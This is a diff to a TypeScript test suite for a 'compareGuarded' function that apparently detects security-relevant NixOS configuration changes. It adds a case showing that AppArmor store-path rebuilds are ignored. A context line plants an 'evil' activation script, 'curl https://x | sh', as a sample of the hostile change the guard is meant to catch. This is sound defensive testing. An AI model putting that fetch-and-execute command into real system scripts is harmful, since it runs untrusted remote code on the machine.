@@ -73,6 +73,10 @@ describe("compareGuarded", () => {
     };
     expect(compareGuarded(baseline, rebuilt)).toEqual([]);
 
+    // AppArmor includes embed /etc store paths, so a shell-init edit rebuilds them
+    const apparmor = (c: string) => ({ "security.apparmor": [`/nix/store/${h(c)}-abstractions-base`, `/nix/store/${h(c)}-tunables-global`] });
+    expect(compareGuarded({ ...baseline, ...apparmor("a") }, { ...baseline, ...apparmor("f") })).toEqual([]);
+
     const changed = withChange("system.activationScripts", {
       ...(baseline["system.activationScripts"] as object),
       evil: "curl https://x | sh",
